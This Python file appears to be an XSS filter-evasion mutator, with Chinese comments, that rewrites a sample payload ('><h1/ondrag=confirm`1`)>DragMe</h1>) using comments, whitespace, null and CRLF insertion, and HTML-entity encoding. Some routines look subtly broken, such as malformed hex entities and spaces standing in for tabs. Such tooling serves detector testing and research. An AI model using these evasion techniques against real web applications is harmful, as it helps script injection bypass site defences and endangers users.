#-*- coding:utf-8 –*-
import numpy as np
import re
import random

class Xss_Manipulator(object):
    def __init__(self):
        self.dim = 0
        self.name= ""

    ACTION_TABLE = {
    #'charTo16': 'charTo16',    # 随机字符转16进制，比如：a转换成&#x61
    #'charTo10': 'charTo10',    # 随机字符转10进制，比如：a转换成&#97
    #'charTo10Zero': 'charTo10Zero',    # 随机字符转10进制并加入大量0，比如：a转换成&#000097；
    'addComment': 'addComment',     # 插入注释，比如：/*abcde*/
    'addTab': 'addTab',     # 插入Tab制表符
    'addZero': 'addZero',   # 插入 \00 ，其也会被浏览器忽略
    'addEnter': 'addEnter',     # 插入回车
    }

    def charTo16(self,str,seed=None):
        # print "charTo16"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)      # 正则
        if matchObjs:
            # print "search --> matchObj.group() : ", matchObjs
            modify_char = random.choice(matchObjs)      # 随机选择
            modify_char_16 = "&#{};".format(hex(ord(modify_char)))      # 字符转ascii值
            # print "modify_char %s to %s" % (modify_char,modify_char_10)
            str = re.sub(modify_char, modify_char_16, str,count=random.randint(1,3))    # 替换

        return str

    def charTo10(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)   # 正则
        if matchObjs:
            # print "search --> matchObj.group() : ", matchObjs
            modify_char=random.choice(matchObjs)    # 随机选择
            modify_char_10="&#{};".format(ord(modify_char))     # 字符转ascii值
            # print "modify_char %s to %s" % (modify_char,modify_char_10)
            str=re.sub(modify_char, modify_char_10, str)       # 替换

        return str

    def charTo10Zero(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)     # 正则
        if matchObjs:
            # print "search --> matchObj.group() : ", matchObjs
            modify_char=random.choice(matchObjs)    # 随机选择
            modify_char_10="&#000000{};".format(ord(modify_char))    # 字符转ascii值
            # print "modify_char %s to %s" % (modify_char,modify_char_10)
            str=re.sub(modify_char, modify_char_10, str)    # 替换

        return str

    def addComment(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)       # 正则
        if matchObjs:
            modify_char=random.choice(matchObjs)    # 选择替换的字符
            modify_char_comment = "{}/*8888*/".format(modify_char)      # 生成替换的内容
            str=re.sub(modify_char, modify_char_comment, str)       # 替换

        return str

    def addTab(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)   # 正则
        if matchObjs:
            modify_char=random.choice(matchObjs)    # 选择替换的字符
            modify_char_tab="   {}".format(modify_char)     # 生成替换的内容    
            str=re.sub(modify_char, modify_char_tab, str)   # 替换

        return str

    def addZero(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)   # 正则
        if matchObjs:
            modify_char=random.choice(matchObjs)    # 选择替换的字符
            modify_char_zero="\\00{}".format(modify_char)       # 生成替换的内容
            str=re.sub(modify_char, modify_char_zero, str)  # 替换

        return str

    def addEnter(self,str,seed=None):
        # print "charTo10"
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)       # 正则
        if matchObjs:
            modify_char=random.choice(matchObjs)    # 选择替换的字符
            modify_char_enter="\\r\\n{}".format(modify_char)    # 生成替换的内容
            str=re.sub(modify_char, modify_char_enter, str)     # 替换

        return str

    def modify(self, str, _action, seed=6):
        print ("采取免杀操作为：%s" % _action)
        action_func=Xss_Manipulator().__getattribute__(_action)

        return action_func(str,seed)


if __name__ == '__main__':
    f=Xss_Manipulator()
    a=f.modify("><h1/ondrag=confirm`1`)>DragMe</h1>","charTo10")
    print (a)

    b=f.modify("><h1/ondrag=confirm`1`)>DragMe</h1>","charTo16")
    print(b)